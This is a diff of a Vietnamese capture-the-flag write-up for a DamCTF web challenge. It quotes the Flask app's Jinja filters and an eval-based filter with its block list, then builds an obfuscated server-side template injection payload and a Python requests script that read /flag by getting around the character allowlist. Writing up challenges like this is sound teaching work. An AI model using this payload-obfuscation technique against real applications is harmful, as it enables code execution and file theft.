@@ -22,7 +22,7 @@ def index(path=""):
     with open(path, "r") as f:
         return render_template("index.html", code=f.read())
   ``` 
-  Bằng cách chèn __/path__ thì ta có thể đọc bất kỳ file trong thư mục __/chal__ vì dấu `..` và `/` đã bị filter
+  Bằng cách chèn __/path__ giúp ta có thể đọc file trong thư mục __/chal__ vì dấu `..` và `/` đã bị filter nên không thể đọc bên ngoài thư mục __/chall__
   ```
 from check import detect_remove_hacks
 from filters import *
@@ -32,10 +32,58 @@ from filters import *
 ![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/7.png)
 và đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/filters.py` để đọc tệp __filters.py__
 ![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/8.png)
-sau khi đọc qua các tệp thì tóm tắt là tại path __/secure_translate__ chỉ cần chèn payload vào parameter __payload__ thì ta sẽ thấy web bị lỗi ssti nhưng chỉ có một vài  ký tự được cho phép còn lại đều bị chặn
+</br>tóm tắt là tại path __/secure_translate__ chỉ cần chèn payload vào parameter __?payload=__ thì ta sẽ thấy web bị lỗi ssti, chỉ có một vài  ký tự được cho phép còn lại đều bị chặn
 ```  allowlist = [
         "c", "{","}","d","6","l","(","b","o","r",")",'"',"1","4","+","h","u","-","*","e","|","'",
     ]
 ```
+và ở tệp __app.py__ có những dòng lệnh này
+```
+server = Flask(__name__)
 
+# Add filters to the jinja environment to add string
+# manipulation capabilities
+server.jinja_env.filters["u"] = uppercase
+server.jinja_env.filters["l"] = lowercase
+server.jinja_env.filters["b64d"] = b64d
+server.jinja_env.filters["order"] = order
+server.jinja_env.filters["ch"] = character
+server.jinja_env.filters["e"] = e
+```
+tóm gọn là hàm e là __eval__ và hàm ch là __chr__, ta sẽ quan tâm một xíu ở hàm e (đọc file filters.py)
+```
+def e(x):
+    # Security analysts reviewed this and said eval is unsafe (haters).
+    # They would not approve this as "hack proof" unless I add some
+    # checks to prevent easy exploits.
+
+    print(f"Evaluating: {x}")
+
+    forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]
+
+    for y in forbidlist:
+        if y in x:
+            return "Eval Failed: Foridlist."
+
+    if x[0:4] == "open" or x[0:4] == "eval":
+        return "Not That Easy ;)"
+
+    try:
+        return eval(x)
+    except Exception as exc:
+        return f"Eval Failed: {exc}"
+```
+4 ký tự đầu không được là __open__ và __exec__ , payload ban đầu của tôi là `{""+open('/flag').read()|e}` để bypass filter tôi đã sửa thành `{{('""%2bo'%2b((111%2b1)|ch)%2b'e'%2b((111-1)|ch)%2b'("'%2b((46%2b1)|ch)%2b((114-11-1)|ch)%2b'l'%2b((46%2b46%2b6-1)|ch)%2b((114-11)|ch)%2b'")'%2b(46|ch)%2b're'%2b((46%2b46%2b6-1)|ch)%2b'd()')|e}}` độ dài payload 153, giới hạn độ dài của tác giả là 161
+flag là dam{p4infu1_all0wl1st_w3ll_don3}
+
+```
+
+import requests
+s = requests.session()
+payload='''{{('""%2bo'%2b((111%2b1)|ch)%2b'e'%2b((111-1)|ch)%2b'("'%2b((46%2b1)|ch)%2b((114-11-1)|ch)%2b'l'%2b((46%2b46%2b6-1)|ch)%2b((114-11)|ch)%2b'")'%2b(46|ch)%2b're'%2b((46%2b46%2b6-1)|ch)%2b'd()')|e}}''' 
+
+url = 'https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload='+payload
+res = s.get(url).text
+print(res)
+```
 </br>
